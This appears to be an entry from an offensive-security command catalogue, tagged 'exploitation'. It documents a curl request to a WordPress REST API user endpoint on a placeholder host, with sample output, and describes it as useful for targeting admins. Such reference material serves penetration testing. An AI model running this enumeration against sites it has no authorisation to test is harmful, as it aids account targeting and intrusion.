---
id: cmd-curl-user-details
data: 'curl -s https://target.com/wp-json/wp/v2/users/1'
tags:
  - exploitation
  - api
  - disclosure
type: command
output: >-
  {"id":1,"name":"admin","description":"Site
  admin","link":"https://target.com","slug":"admin"}
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:10.938Z'
verified: false
validated: true
submitted: true
---
# curl-user-details

## Command

```bash
curl -s https://target.com/wp-json/wp/v2/users/1
```

## Description

Fetches detailed information for a specific user ID via WordPress REST API, useful for targeting admins in vulnerable versions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| `https://target.com/wp-json/wp/v2/users/1` | Specific user endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -s https://target.com/wp-json/wp/v2/users/1
```

### Advanced Usage

```bash
curl -s https://target.com/wp-json/wp/v2/users/2?context=view
```

## Expected Output

JSON object with user details like name, slug, and description.

## Related

- [[Related Procedure: Exploit-WordPress-REST-API-Info-Disclosure]]
